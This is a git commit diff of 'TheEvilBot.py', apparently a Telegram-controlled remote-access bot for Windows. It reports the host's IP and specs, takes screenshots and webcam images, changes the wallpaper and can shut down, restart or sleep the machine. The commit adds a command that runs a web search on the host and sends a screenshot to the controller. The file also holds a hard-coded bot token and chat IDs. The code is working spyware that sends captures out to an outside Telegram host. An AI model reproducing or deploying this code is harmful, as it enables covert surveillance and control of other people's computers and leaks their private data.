9dadcb1bd233e0c8ed1bef51d9345e5dcbfd4f5d
X1ag <83949999+X1ag@users.noreply.github.com>
2022-06-24 09:25:47 +0300

    Update TheEvilBot.py

--- TheEvilBot.py
+++ TheEvilBot.py
@@ -1,12 +1,13 @@
 import requests
 import cv2
 import ctypes
+import time
 import pyautogui as pag
 import platform as pf
 import os
 import telebot
 from telebot import types
-from telebot import version
+import webbrowser
 
 token = '5386789204:AAG3pJ7T3dWrn-SsqOWIbPFOtZwLbp7_7-o'
 chat_id1 = '744246158'
@@ -14,14 +15,14 @@ chat_id = '1455902697'
 bot = telebot.TeleBot(token)
 
 requests.post(
-    f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=Выбери команду: /ip, /spec, /screenshot, /webcam, /message, /input, /wallpaper, /off, /restart, /sleep")
+    f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=Выбери команду: /ip, /spec, /screenshot, /webcam, /message, /input, /wallpaper, /off, /restart, /sleep, /request")
 
 
 @bot.message_handler(commands=['start'])
 def start(message):
     rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
     btns = ['/ip', '/spec', '/screenshot', '/webcam',
-            '/message', '/input', '/wallpaper', '/off', '/restart', '/sleep']
+            '/message', '/input', '/off', '/restart', '/sleep', '/request']
 
     for btn in btns:
         rmk.add(types.KeyboardButton(btn))
@@ -94,21 +95,24 @@ def next_message_sending_with_input(message):
 
 @bot.message_handler(commands=['wallpaper'])
 def wallpaper(message):
-    msg = bot.send_message(message.chat.id, 'Отправьте картинку или ссылку')
+    msg = bot.send_message(message.chat.id, 'Отправьте картинку')
     bot.register_next_step_handler(msg, next_wallpaper)
 
 
 @bot.message_handler(content_types=['photo'])
 def next_wallpaper(message):
-    file = message.photo[-1].file_id
-    file = bot.get_file(file)
-    dfile = bot.download_file(file.file_path)
+    try:
+        file = message.photo[-1].file_id
+        file = bot.get_file(file)
+        dfile = bot.download_file(file.file_path)
 
-    with open('image.jpg', 'wb') as img:
-        img.write(dfile)
+        with open('image.jpg', 'wb') as img:
+            img.write(dfile)
 
-    path = os.path.abspath('image.jpg')
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
+        path = os.path.abspath('image.jpg')
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
+    except Exception:
+        bot.send_message(message.chat.id, 'Видимо, это не картинка')
 
 
 @bot.message_handler(commands=['off'])
@@ -151,5 +155,29 @@ def sleep(message):
     os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
     bot.send_message(message.chat.id, 'Ноутбук в режиме сна')
 
+
+@bot.message_handler(commands=['request'])
+def get_request(message):
+    msg = bot.send_message(message.chat.id, 'Какой запрос хотите сделать?')
+    bot.register_next_step_handler(msg, next_request)
+
+
+@bot.message_handler(content_types=['text'])
+def next_request(message):
+    webbrowser.open_new_tab('https://www.google.com/search?q={}'.format(f'{message.text}'))
+    countdown(5)
+    pag.screenshot('000.jpg')
+
+    with open('000.jpg', 'rb') as img:
+        bot.send_photo(message.chat.id, img)
+
+
+def countdown(num_of_secs):
+    while num_of_secs:
+        m, s = divmod(num_of_secs, 60)
+        min_sec_format = '{:02d}:{:02d}'.format(m, s)
+        print(min_sec_format, end='/r')
+        time.sleep(1)
+        num_of_secs -= 1
 
 bot.polling()
